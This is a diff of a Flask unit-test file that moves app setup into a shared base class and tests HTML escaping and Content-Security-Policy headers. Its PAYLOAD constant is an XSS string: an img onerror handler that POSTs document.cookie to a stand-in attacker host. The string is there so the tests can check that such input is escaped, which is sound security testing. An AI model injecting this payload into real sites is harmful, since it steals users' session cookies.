@@ -12,45 +12,18 @@ from unittest import mock
 
 from flask import Flask
 
+from application import TEMPLATES_DIR
 from config import load_config
-from login import create_login_client
-from models import db
-from offerings import create_offering_pages
-from security_headers import add_security_headers
-from state import create_state_client
+from tests.unit.support import AppTestCase
 
 PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
 ESCAPED_PAYLOAD = ("&lt;img src=x onerror=&#34;fetch(&#39;https://evil.example&#39;, "
                    "{method: &#39;POST&#39;, body: document.cookie})&#34;&gt;")
-TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
 ENV = {"CANVAS_SERVER_URL": "https://canvas.test/", "CANVAS_CLIENT_ID": "id",
        "CANVAS_CLIENT_SECRET": "secret", "SECRET_KEY": "test", "DATABASE_URL": "sqlite:///:memory:"}
 
 
-class SecurityHeaderTests(unittest.TestCase):
-    def setUp(self):
-        self.app = Flask(__name__)
-        self.app.config.update(
-            SECRET_KEY="test", TESTING=True,
-            SQLALCHEMY_DATABASE_URI="sqlite:///:memory:",
-            CANVAS_SERVER_URL="https://canvas.test/",
-            CANVAS_CLIENT_ID="id", CANVAS_CLIENT_SECRET="secret",
-        )
-        db.init_app(self.app)
-        create_state_client(self.app)
-        create_login_client(self.app)
-        create_offering_pages(self.app)
-        add_security_headers(self.app)
-        self.context = self.app.app_context()
-        self.context.push()
-        db.create_all()
-        self.client = self.app.test_client()
-
-    def tearDown(self):
-        db.session.remove()
-        db.drop_all()
-        self.context.pop()
-
+class SecurityHeaderTests(AppTestCase):
     def test_oauth_error_is_escaped(self):
         for query_string in [
             {"error": "access_denied", "error_description": PAYLOAD},
@@ -66,8 +39,8 @@ class SecurityHeaderTests(unittest.TestCase):
     def test_every_response_has_a_content_security_policy(self):
         for path in ["/", "/offerings/", "/offerings/101/api/state", "/authorized/?error=access_denied",
                      "/assets/css/style.css", "/missing"]:
-            with self.subTest(path=path):
-                response = self.client.get(path)
+            # Closing the response closes the stylesheet's file.
+            with self.subTest(path=path), self.client.get(path) as response:
                 policy = dict(directive.split(" ", 1)
                               for directive in response.headers["Content-Security-Policy"].split("; "))
                 # an injected script cannot fetch() or load an image from another site to hand it data
